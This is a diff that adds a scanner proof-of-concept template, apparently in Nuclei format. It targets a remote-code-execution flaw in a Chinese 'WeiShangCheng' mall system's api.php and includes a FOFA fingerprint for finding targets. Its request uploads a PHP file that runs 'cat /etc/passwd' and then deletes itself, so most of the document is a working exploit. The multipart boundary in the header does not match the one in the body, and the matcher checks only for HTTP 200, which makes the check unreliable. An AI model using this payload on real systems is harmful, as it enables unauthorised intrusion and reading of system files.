@@ -1,0 +1,35 @@
+id: poc-nyeoqhir04vc0s7c
+info:
+  name: 微商城系统 api.php存在RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nyeoqhir04vc0s7c'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: nyeoqhir04vc0s7c
+    fofa: body="/Mao_Public/js/jquery-2.1.1.min.js"
+http:
+- raw:
+  - 'POST /api/api.php?mod=upload&type=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTqkdY1lCvbvpmown
+
+    ------WebKitFormBoundaryaKljzbg49Mq4ggLz
+
+    Content-Disposition: form-data; name="file"; filename="rce.php"
+
+    Content-Type: image/png
+
+    <?php system("cat /etc/passwd");unlink(__FILE__);?>
+
+    ------WebKitFormBoundaryaKljzbg49Mq4ggLz--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
